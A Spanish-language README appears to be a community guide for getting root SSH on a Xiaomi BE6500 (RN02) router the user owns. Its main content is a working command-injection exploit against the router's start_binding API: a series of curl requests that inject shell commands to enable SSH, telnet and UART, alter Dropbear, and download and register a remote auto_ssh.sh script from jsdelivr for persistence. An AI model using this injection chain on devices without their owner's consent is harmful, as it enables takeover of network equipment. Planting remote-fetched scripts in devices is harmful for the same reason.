# Xiaomi BE6500 (RN02) SSH Unlock
Guía completa en español para desbloquear el acceso SSH en el router Xiaomi BE6500 (modelo RN02) con firmware v1.0.43 (y posiblemente superiores). 

Esta guía detalla cómo habilitar el servicio SSH de forma permanente, configurar AutoSSH para que persista tras reiniciar y poder gestionar tu router a través de la terminal.

## Requisitos Previos
1. Estar conectado a la red local del router (por cable o Wi-Fi).
2. Conocer la contraseña de administración del router.
3. El número de serie (SN) de tu router (se encuentra en la etiqueta debajo del dispositivo o en la aplicación MiWiFi).
4. Un terminal (Linux, macOS, WSL o PowerShell en Windows) con `curl` instalado.

## Paso 1: Calcular la Contraseña SSH por Defecto
El sistema SSH del router viene protegido por defecto con una contraseña basada en tu Número de Serie (SN). 
Para obtener esta contraseña:
1. Entra a [miwifi.dev/ssh](https://miwifi.dev/ssh)
2. Ingresa el SN exacto de tu router (ej. `57941/F4U644188`).
3. Haz clic en "Calc".
4. **Anota la contraseña generada** (ej. `be9b1227`). La necesitarás más adelante.

## Paso 2: Obtener el Token de Sesión (stok)
Para comunicarnos con la API del router y ejecutar el exploit, necesitamos tu token de sesión actual:
1. Inicia sesión en la interfaz web de tu router desde el navegador (usualmente en `http://192.168.1.1` o `http://miwifi.com`).
2. Una vez dentro, fíjate en la barra de direcciones (URL) de tu navegador.
3. Verás una dirección similar a esta:
   `http://192.168.1.1/cgi-bin/luci/;stok=a1b2c3d4e5f6g7h8i9j0/web/home`
4. Copia el valor exacto que aparece después de `stok=`. En este ejemplo sería `a1b2c3d4e5f6g7h8i9j0`.

## Paso 3: Ejecutar el Exploit para Encender el SSH
En este paso, usaremos una vulnerabilidad en la API de configuración para forzar al router a encender el servicio SSH (Dropbear) e instalar la persistencia.

Puedes ejecutar el archivo `unlock_ssh.sh` incluido en este repositorio (ej. `./unlock_ssh.sh TU_STOK`), o ejecutar los siguientes comandos manualmente en tu terminal:

*(Asegúrate de reemplazar `<TU_STOK>` con el token que copiaste en el Paso 2)*

```bash
STOK="<TU_STOK>"
IP="192.168.1.1"

# 1. Habilitar SSH, Telnet y guardar variables en NVRAM para persistencia
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20ssh_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20telnet_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20uart_en%3D1%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20set%20boot_wait%3Don%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Anvram%20commit%27"

# 2. Descargar y configurar script de auto_ssh para que el puerto sobreviva a los reinicios
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Amkdir%20-p%20%2Fdata%2Fauto_ssh%20%26%26%20cd%20%2Fdata%2Fauto_ssh%20%26%26%20curl%20-O%20https%3A%2F%2Ffastly.jsdelivr.net%2Fgh%2Flemoeo%2FAX6S%40main%2Fauto_ssh.sh%20%26%26%20chmod%20%2Bx%20auto_ssh.sh%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Auci%20set%20firewall.auto_ssh%3Dinclude%20%26%26%20uci%20set%20firewall.auto_ssh.type%3D%27script%27%20%26%26%20uci%20set%20firewall.auto_ssh.path%3D%27%2Fdata%2Fauto_ssh%2Fauto_ssh.sh%27%20%26%26%20uci%20set%20firewall.auto_ssh.enabled%3D%271%27%20%26%26%20uci%20commit%20firewall%27"

# 3. Modificar seguridad en Dropbear y encender el servicio
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0Ased%20-i%20%27s%2Fchannel%3D.%2A%2Fchannel%3D%22debug%22%2Fg%27%20%2Fetc%2Finit.d%2Fdropbear%27"
curl -s "http://$IP/cgi-bin/luci/;stok=$STOK/api/xqsystem/start_binding?uid=1234&key=1234%27%0A%2Fetc%2Finit.d%2Fdropbear%20start%27"
```

## Paso 4: Conectarse y Cambiar la Contraseña
Si todo salió bien, el puerto 22 de tu router ya se encuentra habilitado y puedes ingresar de forma normal.

1. Conéctate vía SSH desde tu terminal:
   ```bash
   ssh root@192.168.1.1
   ```
2. Cuando te pida contraseña, ingresa **la que calculaste en el Paso 1** (`miwifi.dev/ssh`).
3. Una vez dentro (verás el mensaje de bienvenida `Linux XiaoQiang`), puedes cambiar la contraseña por defecto a algo tuyo usando el siguiente comando:
   ```bash
   passwd root
   ```
   *Nota importante: Xiaomi a veces bloquea el comando tradicional de contraseñas. Si te marca un error como "password unchanged", utiliza este método forzado (reemplazando `NUEVA_CLAVE` con tu contraseña deseada):*
   ```bash
   echo -e "NUEVA_CLAVE\nNUEVA_CLAVE" | passwd root --stdin
   ```

¡Y listo! Ya tienes acceso completo de administrador (root) al sistema interno de tu Xiaomi BE6500.

## Notas Adicionales
- Cuidado al modificar archivos internos, el router monta el sistema de archivos en varias particiones y borrar carpetas protegidas como `/etc` puede causar un "brick".
- Si realizas un borrado de fábrica (Hard Reset), la vulnerabilidad de la API podría seguir existiendo, pero tendrás que repetir este proceso de inyección.

## Créditos
- Investigación y método original basado en la comunidad de OpenWrt y descubrimientos en repositorios para la familia AX/BE de Xiaomi.
- Repositorio y adaptación al español por [gariarellano](https://github.com/gariarellano).
